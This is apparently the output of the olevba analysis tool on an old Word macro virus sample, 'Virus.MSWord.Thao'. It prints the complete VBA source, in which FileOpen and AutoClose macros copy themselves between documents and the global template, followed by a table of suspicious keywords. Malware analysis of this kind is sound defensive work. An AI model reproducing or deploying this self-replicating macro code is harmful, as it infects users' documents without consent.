olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Thao
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Thao - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: ./Virus.MSWord.Thao - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
Dim ExecuteOnly
On Error GoTo -1: On Error GoTo quit
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
    WordBasic.CurValues.FileOpen dlg
    WordBasic.Dialog.FileOpen dlg
    WordBasic.FileOpen dlg
    WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
WordBasic.MacroCopy "Global:FileOpen", WordBasic.[FileName$]() + ":FileOpen", ExecuteOnly
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", ExecuteOnly
    WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
WordBasic.MsgBox "I loce you, Thao", "Microsoft Word"
quit:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Thao - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Closes all of the windows of the active document"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
Dim ExecuteOnly
On Error GoTo -1: On Error GoTo quit
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileOpen", "Global:FileOpen", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", ExecuteOnly
quit:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

